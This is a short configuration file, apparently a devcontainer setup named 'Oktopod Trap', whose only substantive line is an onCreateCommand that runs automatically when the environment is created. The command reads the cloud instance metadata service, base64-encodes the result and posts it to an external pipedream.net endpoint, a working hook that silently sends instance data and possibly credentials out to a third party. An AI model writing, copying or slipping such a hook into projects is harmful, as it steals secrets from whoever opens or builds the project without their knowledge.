name: Oktopod Trap
onCreateCommand: curl -s -H "Metadata: true" --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" > /tmp/keys.txt && curl -X POST -H "Content-Type: application/json" -d "{\"data\": \"$(cat /tmp/keys.txt | base64)\"}" https://eohy4bu3oztwkj0.m.pipedream.net/
